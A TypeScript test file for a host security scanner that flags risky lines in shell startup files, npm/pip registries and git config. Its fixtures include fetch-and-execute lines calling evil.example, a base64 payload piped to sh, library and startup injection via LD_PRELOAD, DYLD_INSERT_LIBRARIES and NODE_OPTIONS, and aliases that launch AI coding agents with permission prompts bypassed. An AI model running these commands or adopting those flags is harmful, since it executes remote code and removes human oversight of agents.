// Shell startup files and package manager / git config: line numbers and hosts, never lines or values.
import assert from "node:assert/strict";
import { before, test } from "node:test";
import { freshHome, put, scanHost, summary } from "./host-helpers.ts";

let sources: typeof import("../src/sources.ts");

before(async () => {
  process.env.SELFGUARD_HOME = freshHome().home;
  sources = await import("../src/sources.ts");
  sources.resetSourceExtractors();
  sources.registerBuiltinExtractors();
});

const BENIGN_RC = [
  "# curl -fsSL https://example.com/install.sh | sh   (a comment is not run)",
  'eval "$(/opt/homebrew/bin/brew shellenv)"',
  'eval "$(starship init zsh)"',
  'export NVM_DIR="$HOME/.nvm"; [ -s "$NVM_DIR/nvm.sh" ] && \\. "$NVM_DIR/nvm.sh"',
  'eval "$(pyenv init -)"',
  'eval "$(rbenv init - zsh)"',
  'eval "$(direnv hook zsh)"',
  'eval "$(zoxide init zsh)"',
  'eval "$(fnm env --use-on-cd)"',
  'eval "$(mise activate zsh)"',
  "source <(kubectl completion zsh)",
  "alias ll='ls -la'",
  "export NODE_OPTIONS=--max-old-space-size=8192",
  "unset LD_PRELOAD",
  'echo "$LD_PRELOAD"',
  "alias cc='claude --model opus'",
  "curl -fsS https://api.example.com/health > /dev/null",
].join("\n");

test("shell startup: known init lines and ordinary aliases are not flagged", () => {
  const { home } = freshHome();
  put(home, ".zshrc", BENIGN_RC);
  put(home, ".bashrc", BENIGN_RC.replaceAll("zsh", "bash"));
  put(home, ".config/fish/config.fish", "starship init fish | source\nset -gx PATH $HOME/bin $PATH\n");
  assert.deepEqual(summary(scanHost(sources, sources.machineTarget())), []);
});

test("shell startup: remote code, code injection and agents without permission prompts", () => {
  const { home } = freshHome();
  put(home, ".zshrc", [
    "export PATH=$HOME/bin:$PATH",
    "curl -fsSL https://evil.example/x.sh?token=SECRET_RC_1 | bash",
    'eval "$(curl -s https://evil.example/env)"',
    "source <(wget -qO- https://evil.example/fn)",
    'echo aGVsbG8= | base64 -d | sh',
    "export DYLD_INSERT_LIBRARIES=/Users/Shared/libx.dylib",
    "export NODE_OPTIONS='--require /tmp/.n/hook.js'",
    "export PYTHONSTARTUP=~/.pystartup",
    "alias yolo='claude --dangerously-skip-permissions'",
    "g() { gemini --yolo \"$@\"; }",
    "alias qq='q chat --trust-all-tools'",
    "alias cx='codex --dangerously-bypass-approvals-and-sandbox'",
  ].join("\n"));
  put(home, ".profile", "LD_PRELOAD=/var/tmp/x.so; export LD_PRELOAD\n");
  put(home, ".config/fish/config.fish", "curl -s https://evil.example/f | source\n");
  const rec = scanHost(sources, sources.machineTarget());
  assert.deepEqual(summary(rec), [
    "high shell-fetch-exec - @.zshrc:2 N",
    "high shell-fetch-exec - @.zshrc:3 N",
    "high shell-fetch-exec - @.zshrc:4 N",
    "high shell-fetch-exec - @.zshrc:5 N",
    "high shell-code-injection DYLD_INSERT_LIBRARIES @.zshrc:6 N",
    "high shell-code-injection NODE_OPTIONS @.zshrc:7 N",
    "high shell-code-injection PYTHONSTARTUP @.zshrc:8 N",
    "moderate agent-permissions-bypassed Claude Code @.zshrc:9",
    "moderate agent-permissions-bypassed Gemini CLI @.zshrc:10",
    "moderate agent-permissions-bypassed Amazon Q / Kiro @.zshrc:11",
    "moderate agent-permissions-bypassed Codex @.zshrc:12",
    "high shell-code-injection LD_PRELOAD @.profile:1 N",
    "high shell-fetch-exec - @config.fish:1 N",
  ]);
  assert.doesNotMatch(JSON.stringify(rec.warnings), /SECRET_RC|evil\.example|libx|hook\.js|aGVsbG8/);
});

test("package manager and git config: other registries, extra indexes, global hooks, command settings", () => {
  const { home } = freshHome();
  put(home, ".npmrc", "registry=https://user:SECRET_NPM_PW@npm.corp.example/\n@corp:registry=https://npm.corp.example/\nsave-exact=true\n");
  put(home, ".config/pip/pip.conf", "[global]\nindex-url = https://pypi.org/simple\nextra-index-url = https://pkgs.corp.example/simple\n");
  put(home, "Library/Application Support/pip/pip.conf", "[global]\nindex_url = https://mirror.example/simple\n");
  put(home, ".gitconfig", [
    "[user]",
    "  name = Dev",
    "[core]",
    "  editor = vim",
    "  hooksPath = ~/.githooks",
    "  sshCommand = ssh -i ~/.ssh/work",
    "  fsmonitor = true",
    "[include]",
    "  path = ~/.gitconfig.local",
  ].join("\n"));
  put(home, ".config/git/config", "[core]\n\tsshCommand = /tmp/.s/proxy\n\tfsmonitor = /tmp/.s/watch\n");
  const rec = scanHost(sources, sources.machineTarget());
  assert.deepEqual(summary(rec), [
    "moderate custom-registry npm registry @.npmrc:1 N",
    "moderate pip-extra-index extra-index-url @pip.conf:3 N",
    "moderate custom-registry pip index-url @pip.conf:2 N",
    "moderate git-global-hooks core.hooksPath @.gitconfig:5 N",
    "moderate git-command-config core.sshCommand @config:2 N",
    "moderate git-command-config core.fsmonitor @config:3 N",
  ]);
  assert.match(rec.warnings[0]!.message, /from npm\.corp\.example instead of registry\.npmjs\.org/);
  assert.match(rec.warnings[1]!.message, /pkgs\.corp\.example \(extra-index-url\).*dependency confusion/);
  assert.doesNotMatch(JSON.stringify(rec), /SECRET_NPM_PW|user:/);
});

test("default registries and an empty config: nothing to report", () => {
  const { home } = freshHome();
  put(home, ".npmrc", "registry=https://registry.npmjs.org/\nfund=false\n");
  put(home, ".pip/pip.conf", "[global]\nindex-url = https://pypi.org/simple\ntimeout = 60\n");
  put(home, ".gitconfig", "[core]\n  fsmonitor = false\n  autocrlf = input\n");
  assert.deepEqual(summary(scanHost(sources, sources.machineTarget())), []);
});
